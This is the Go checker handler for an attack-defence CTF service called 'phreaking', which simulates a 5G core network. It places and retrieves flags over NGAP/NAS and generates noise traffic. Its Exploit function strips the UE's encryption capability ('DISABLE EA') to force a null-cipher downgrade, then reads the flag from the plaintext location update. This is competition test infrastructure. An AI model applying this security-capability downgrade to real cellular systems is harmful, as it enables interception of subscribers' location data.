package handler

import (
	"bytes"
	"context"
	"errors"
	"net"
	"os"
	"strconv"

	"checker/internal/crypto"
	"checker/internal/io"
	"checker/internal/nas"
	"checker/internal/ngap"
	"checker/internal/parser"
	"checker/internal/pb"

	"github.com/enowars/enochecker-go"
	"github.com/redis/go-redis/v9"
	"go.uber.org/zap"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/metadata"
)

var serviceInfo = &enochecker.InfoMessage{
	ServiceName:     "phreaking",
	FlagVariants:    1,
	NoiseVariants:   2,
	HavocVariants:   1,
	ExploitVariants: 1,
}

var ErrVariantNotFound = errors.New("variant not found")

type Handler struct {
	logger *zap.Logger
	db     *redis.Client
}

func New(log *zap.Logger, db *redis.Client) *Handler {
	return &Handler{
		logger: log,
		db:     db,
	}
}

var roundCounter int

func getPortNum() (port string) {
	portNum := strconv.Itoa(int(roundCounter % 10))
	return portNum
}

func incPortNum() {
	roundCounter++
	roundCounter = roundCounter % 10
}

func (h *Handler) PutFlag(ctx context.Context, message *enochecker.TaskMessage) (*enochecker.HandlerInfo, error) {
	incPortNum()
	portNum := getPortNum()
	port := "993" + portNum
	var conn *grpc.ClientConn
	conn, err := grpc.Dial(message.Address+":"+port, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	c := pb.NewLocationClient(conn)

	grpcEnvVar := "PHREAKING_" + strconv.Itoa(int(message.TeamId)) + "_GRPC_PASS"

	md := metadata.Pairs("auth", string(os.Getenv(grpcEnvVar)))
	ctx_grpc := metadata.NewOutgoingContext(context.Background(), md)
	_, err = c.UpdateLocation(ctx_grpc, &pb.Loc{Position: message.Flag})
	if err != nil {
		return nil, err
	}
	port = "606" + portNum
	if err = h.db.Set(ctx, message.TaskChainId, port, 0).Err(); err != nil {
		h.logger.Error(err.Error())
		return nil, enochecker.NewMumbleError(errors.New("not able to write taskid to db"))
	}
	return enochecker.NewPutFlagInfo(port), nil
}

func (h *Handler) getFlagLocation(ctx context.Context, message *enochecker.TaskMessage) error {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return err
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return err
	}

	port, err := h.db.Get(ctx, message.TaskChainId).Result()
	if err != nil {
		return enochecker.NewMumbleError(errors.New("no entry for task id"))
	}

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return err
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return err
	}

	defer func() {
		coreConn.Close()
		ueConn.Close()
	}()

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	err = io.SendNgapMsg(coreConn, ngap.NGSetupRequest, &setup)
	if err != nil {
		return err
	}

	_, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	var gmm nas.GmmHeader

	reply, err := io.Recv(ueConn)
	if err != nil {
		return err
	}

	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return err
	}

	initUeMsg := ngap.InitUEMessageMsg{NasPdu: gmm, RanUeNgapId: 1}
	err = io.SendNgapMsg(coreConn, ngap.InitUEMessage, &initUeMsg)
	if err != nil {
		return err
	}

	// AuthReq
	reply, err = io.Recv(coreConn)
	if err != nil {
		return err
	}
	var ngapHeader ngap.NgapHeader
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	var down ngap.DownNASTransMsg
	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return err
	}

	reply, err = io.Recv(ueConn)
	if err != nil {
		return err
	}

	amfUeNgapId := down.AmfUeNgapId

	// AuthRes

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return err
	}

	up := ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return err
	}

	// SecModeCmd
	reply, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return err
	}

	// LocationUpdate
	reply, err = io.Recv(ueConn)
	if err != nil {
		return err
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return err
	}

	keyEnvVar := "PHREAKING_" + strconv.Itoa(int(message.TeamId)) + "_SIM_KEY"

	key := []byte(string(os.Getenv(keyEnvVar)))

	dec, err := crypto.DecryptAES(gmm.Message, key)
	if err != nil {
		return err
	}

	var loc nas.LocationUpdateMsg
	err = parser.DecodeMsg(dec, &loc)
	if err != nil {
		return err
	}
	if loc.Location == message.Flag {
		return nil
	}
	return enochecker.ErrFlagNotFound
}

func (h *Handler) GetFlag(ctx context.Context, message *enochecker.TaskMessage) error {
	switch message.VariantId {
	case 0:
		return h.getFlagLocation(ctx, message)
	}

	return ErrVariantNotFound
}

func (h *Handler) GetServiceInfo() *enochecker.InfoMessage {
	return serviceInfo
}

func (h *Handler) Exploit(ctx context.Context, message *enochecker.TaskMessage) (*enochecker.HandlerInfo, error) {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return nil, err
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return nil, err
	}

	portNum := getPortNum()
	port := "606" + portNum

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return nil, err
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return nil, err
	}

	defer func() {
		coreConn.Close()
		ueConn.Close()
	}()

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	err = io.SendNgapMsg(coreConn, ngap.NGSetupRequest, &setup)
	if err != nil {
		return nil, err
	}

	_, err = io.Recv(coreConn)
	if err != nil {
		return nil, err
	}

	var gmm nas.GmmHeader

	reply, err := io.Recv(ueConn)
	if err != nil {
		return nil, err
	}

	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return nil, err
	}

	var reg nas.NASRegRequestMsg
	err = parser.DecodeMsg(gmm.Message, &reg)
	if err != nil {
		return nil, errors.New("cannot decode")
	}

	// DISABLE EA
	reg.SecCap.EaCap = 0

	msg, err := parser.EncodeMsg(&reg)
	if err != nil {
		return nil, err
	}

	gmm.Message = msg
	initUeMsg := ngap.InitUEMessageMsg{NasPdu: gmm, RanUeNgapId: 1}
	err = io.SendNgapMsg(coreConn, ngap.InitUEMessage, &initUeMsg)
	if err != nil {
		return nil, err
	}

	// AuthReq
	reply, err = io.Recv(coreConn)
	if err != nil {
		return nil, err
	}
	var ngapHeader ngap.NgapHeader
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return nil, err
	}

	var down ngap.DownNASTransMsg
	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return nil, err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return nil, err
	}

	reply, err = io.Recv(ueConn)
	if err != nil {
		return nil, err
	}

	amfUeNgapId := down.AmfUeNgapId

	// AuthRes

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return nil, err
	}

	up := ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return nil, err
	}

	// SecModeCmd
	reply, err = io.Recv(coreConn)
	if err != nil {
		return nil, err
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return nil, err
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return nil, err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return nil, err
	}

	// LocationUpdate
	reply, err = io.Recv(ueConn)
	if err != nil {
		return nil, err
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return nil, err
	}

	var loc nas.LocationUpdateMsg
	err = parser.DecodeMsg(gmm.Message, &loc)
	if err != nil {
		return nil, err
	}
	return enochecker.NewExploitInfo(loc.Location), nil
}

func (h *Handler) PutNoise(ctx context.Context, message *enochecker.TaskMessage) error {
	portNum := getPortNum()
	port := "606" + portNum
	if err := h.db.Set(ctx, message.TaskChainId, port, 0).Err(); err != nil {
		h.logger.Error(err.Error())
		return enochecker.NewMumbleError(errors.New("not able to write taskid to db"))
	}
	return nil
}

func (h *Handler) GetNoise(ctx context.Context, message *enochecker.TaskMessage) error {
	port, err := h.db.Get(ctx, message.TaskChainId).Result()
	if err != nil {
		return enochecker.NewMumbleError(errors.New("put flag was not called beforehand"))
	}
	switch message.VariantId {
	case 0:
		return h.gnb(ctx, message, port)
	case 1:
		return h.checkNullEnc(ctx, message)
	}

	return ErrVariantNotFound
}

func (h *Handler) checkNullEnc(ctx context.Context, message *enochecker.TaskMessage) error {
	keyEnvVar := "PHREAKING_" + strconv.Itoa(int(message.TeamId)) + "_SIM_KEY"
	key := []byte(string(os.Getenv(keyEnvVar)))

	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return err
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return err
	}

	defer func() {
		coreConn.Close()
	}()

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	err = io.SendNgapMsg(coreConn, ngap.NGSetupRequest, &setup)
	if err != nil {
		return err
	}

	_, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	regMsg := nas.NASRegRequestMsg{SecHeader: 0,
		MobileId: nas.MobileIdType{Mcc: 0, Mnc: 0, ProtecScheme: 0, HomeNetPki: 0, Msin: 0},
		SecCap:   nas.SecCapType{EA: 0, IA: 1},
	}

	msg, err := parser.EncodeMsg(&regMsg)
	if err != nil {
		return err
	}

	gmm := nas.GmmHeader{Security: false, Mac: [8]byte{}, MessageType: nas.NASRegRequest, Message: msg}
	initUeMsg := ngap.InitUEMessageMsg{NasPdu: gmm, RanUeNgapId: 1}
	err = io.SendNgapMsg(coreConn, ngap.InitUEMessage, &initUeMsg)
	if err != nil {
		return err
	}

	reply, err := io.Recv(coreConn)
	if err != nil {
		return err
	}
	var ngapHeader ngap.NgapHeader
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	var down ngap.DownNASTransMsg
	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	amfUeNgapId := down.AmfUeNgapId

	var authReq nas.NASAuthRequestMsg
	err = parser.DecodeMsg(down.NasPdu.Message, &authReq)
	if err != nil {
		return err
	}

	if !(bytes.Equal(crypto.IA2(authReq.AuthRand, key), authReq.Auth)) {
		return errors.New("cannot authenticate core")
	}

	res := crypto.IA2(authReq.Rand, key)
	authRes := nas.NASAuthResponseMsg{SecHeader: 0, Res: res}
	authResMsg, mac, err := nas.BuildMessagePlain(&authRes)
	if err != nil {
		return err
	}

	gmm = nas.GmmHeader{Security: false, Mac: mac, MessageType: nas.NASAuthResponse, Message: authResMsg}
	up := ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return err
	}

	// SecModeCmd
	reply, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	var secMode nas.NASSecurityModeCommandMsg
	err = parser.DecodeMsg(down.NasPdu.Message, &secMode)
	if err != nil {
		return err
	}

	if secMode.EaAlg != 0 {
		return errors.New("null encryption not chosen in security mode command")

	}

	pduEstReq := nas.PDUSessionEstRequestMsg{PduSesId: 0, PduSesType: 0}
	pduEstReqMsg, mac, err := nas.BuildMessage(0, secMode.IaAlg, &pduEstReq, key)
	if err != nil {
		return err
	}
	gmm = nas.GmmHeader{Security: true, Mac: mac, MessageType: nas.PDUSessionEstRequest, Message: pduEstReqMsg}
	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return err
	}

	// PDUSessionAccept
	reply, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	var pduEstAcc nas.PDUSessionEstAcceptMsg

	err = parser.DecodeMsg(down.NasPdu.Message, &pduEstAcc)
	if err != nil {
		return err
	}

	pduReq := nas.PDUReqMsg{PduSesId: pduEstAcc.PduSesId, Request: []byte("http://httpbin.org/html")}

	pduReqMsg, mac, err := nas.BuildMessage(0, secMode.IaAlg, &pduReq, key)
	if err != nil {
		return err
	}

	gmm = nas.GmmHeader{Security: true, Mac: mac, MessageType: nas.PDUReq, Message: pduReqMsg}
	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return err
	}

	reply, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	var pduRes nas.PDUResMsg

	err = parser.DecodeMsg(down.NasPdu.Message, &pduRes)
	if err != nil {
		return err
	}
	return nil
}

func (h *Handler) gnb(ctx context.Context, message *enochecker.TaskMessage, port string) error {
	coretcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":3399")
	if err != nil {
		return err
	}

	coreConn, err := net.DialTCP("tcp", nil, coretcpAddr)
	if err != nil {
		return err
	}

	uetcpAddr, err := net.ResolveTCPAddr("tcp", message.Address+":"+port)
	if err != nil {
		return err
	}

	ueConn, err := net.DialTCP("tcp", nil, uetcpAddr)
	if err != nil {
		return err
	}

	defer func() {
		coreConn.Close()
		ueConn.Close()
	}()

	setup := ngap.NGSetupRequestMsg{GranId: 0, Tac: 0, Plmn: 0}
	err = io.SendNgapMsg(coreConn, ngap.NGSetupRequest, &setup)
	if err != nil {
		return err
	}

	_, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	var gmm nas.GmmHeader

	reply, err := io.Recv(ueConn)
	if err != nil {
		return err
	}

	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return err
	}

	initUeMsg := ngap.InitUEMessageMsg{NasPdu: gmm, RanUeNgapId: 1}
	err = io.SendNgapMsg(coreConn, ngap.InitUEMessage, &initUeMsg)
	if err != nil {
		return err
	}

	// AuthReq
	reply, err = io.Recv(coreConn)
	if err != nil {
		return err
	}
	var ngapHeader ngap.NgapHeader
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	var down ngap.DownNASTransMsg
	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return err
	}

	reply, err = io.Recv(ueConn)
	if err != nil {
		return err
	}

	amfUeNgapId := down.AmfUeNgapId

	// AuthRes

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return err
	}

	up := ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return err
	}

	// SecModeCmd
	reply, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return err
	}

	// LocationUpdate
	reply, err = io.Recv(ueConn)
	if err != nil {
		return err
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return err
	}

	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return err
	}

	// PDUSessionReq
	reply, err = io.Recv(ueConn)
	if err != nil {
		return err
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return err
	}

	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return err
	}

	// PDUSessionAccept

	reply, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return err
	}

	// PDUReq

	reply, err = io.Recv(ueConn)
	if err != nil {
		return err
	}

	gmm = nas.GmmHeader{}
	err = parser.DecodeMsg(reply, &gmm)
	if err != nil {
		return err
	}

	up = ngap.UpNASTransMsg{NasPdu: gmm, RanUeNgapId: 1, AmfUeNgapId: amfUeNgapId}
	err = io.SendNgapMsg(coreConn, ngap.UpNASTrans, &up)
	if err != nil {
		return err
	}

	// PDURes

	reply, err = io.Recv(coreConn)
	if err != nil {
		return err
	}

	ngapHeader = ngap.NgapHeader{}
	err = parser.DecodeMsg(reply, &ngapHeader)
	if err != nil {
		return err
	}

	down = ngap.DownNASTransMsg{}

	err = parser.DecodeMsg(ngapHeader.NgapPdu, &down)
	if err != nil {
		return err
	}

	err = io.SendGmm(ueConn, down.NasPdu)
	if err != nil {
		return err
	}

	return nil
}

func (h *Handler) Havoc(ctx context.Context, message *enochecker.TaskMessage) error {
	return nil
}
